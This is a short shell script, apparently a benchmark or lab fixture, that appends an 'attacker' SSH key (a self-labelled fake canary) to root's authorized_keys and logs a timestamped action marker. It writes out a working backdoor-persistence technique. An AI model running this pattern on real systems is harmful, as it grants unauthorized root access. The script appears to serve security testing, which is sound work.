#!/bin/sh
# Add an attacker SSH key. The key is a fake, self-labelled placeholder.
mkdir -p /root/.ssh
echo "BENCH_ACTION $(date +%s%3N)"
echo 'ssh-ed25519 LAB-CANARY-NOT-A-SECRET bench-05-payload' >> /root/.ssh/authorized_keys
